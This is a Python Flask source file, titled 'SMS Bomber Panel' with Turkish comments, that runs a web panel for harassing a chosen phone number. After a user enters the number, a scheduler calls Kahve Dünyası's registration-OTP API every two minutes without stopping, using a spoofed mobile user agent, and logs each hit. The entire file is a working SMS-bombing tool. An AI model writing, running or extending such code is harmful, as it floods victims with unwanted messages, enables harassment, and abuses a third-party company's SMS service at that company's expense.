from flask import Flask, render_template_string, request, redirect, url_for
from flask_apscheduler import APScheduler
import requests
import time
import os

app = Flask(__name__)

# Zamanlayıcı Ayarları
class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())
scheduler = APScheduler()
scheduler.init_app(app)
scheduler.start()

# Global Değişkenler (Numara ve Kayıtlar)
target_phone = ""
logs = []

def send_kahve_dunyasi_otp():
    global target_phone, logs
    if not target_phone:
        return

    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
    payload = {"mobile_number": target_phone, "country_code": "90"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code in [200, 201]:
            status = "Başarılı ✅"
        else:
            status = f"Hata ❌ ({response.status_code})"
        logs.append(f"[{time.strftime('%H:%M:%S')}] {status}")
    except:
        logs.append(f"[{time.strftime('%H:%M:%S')}] Bağlantı Hatası ⚠️")

    # Son 15 kaydı tut
    if len(logs) > 15: logs.pop(0)

# 2 DAKİKADA BİR GÖNDERİM AYARI (minutes=2)
scheduler.add_job(id='sms_job', func=send_kahve_dunyasi_otp, trigger='interval', minutes=2)

@app.route('/', methods=['GET', 'POST'])
def index():
    global target_phone, logs
    if request.method == 'POST':
        new_phone = request.form.get('phone', '').strip()
        if new_phone:
            target_phone = new_phone
            logs.append(f"[{time.strftime('%H:%M:%S')}] Hedef güncellendi: {target_phone}")
        return redirect(url_for('index'))

    html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS Bomber Panel</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
            .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 360px; text-align: center; }
            h2 { color: #1a73e8; margin-bottom: 20px; }
            input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 2px solid #eee; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
            input[type="text"]:focus { border-color: #1a73e8; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
            button:hover { background: #1557b0; transform: translateY(-2px); }
            .log-box { text-align: left; background: #1c1c1c; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; font-size: 13px; height: 180px; overflow-y: auto; margin-top: 20px; box-shadow: inset 0 0 10px #000; }
            .status-bar { margin-bottom: 15px; padding: 10px; border-radius: 6px; background: #e8f0fe; color: #1967d2; font-size: 14px; font-weight: bold; }
        </style>
        <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 20000);</script>
    </head>
    <body>
        <div class="card">
            <h2>SMS Motoru</h2>
            <div class="status-bar">
                {% if phone %} ● Sistem Aktif: {{ phone }} {% else %} ○ Numara Bekleniyor... {% endif %}
            </div>
            <form method="POST">
                <input type="text" name="phone" placeholder="Örn: 5051234567" value="{{ phone }}">
                <button type="submit">Numarayı Kaydet & Başlat</button>
            </form>
            <div class="log-box">
                {% for log in logs %}<div style="margin-bottom:5px;">> {{ log }}</div>{% endfor %}
            </div>
            <p style="font-size:11px; color:#777; margin-top:15px;">Aralık: 2 Dakika | 24 Saat Kesintisiz</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, phone=target_phone, logs=reversed(logs))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
